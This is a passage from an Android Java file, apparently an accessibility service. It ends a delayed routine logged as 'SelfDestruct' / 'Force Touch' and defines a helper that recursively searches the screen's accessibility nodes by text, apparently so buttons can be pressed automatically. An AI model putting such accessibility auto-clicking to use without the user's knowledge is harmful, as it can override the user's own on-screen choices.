                                Log.d("SelfDestruct", "Force Touch: " + node.getText());
                                return;
                            }
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        }, 800);
    }

    private void findNodesByText(AccessibilityNodeInfo node, String text, List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
            results.add(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findNodesByText(node.getChild(i), text, results);
        }
    }
}
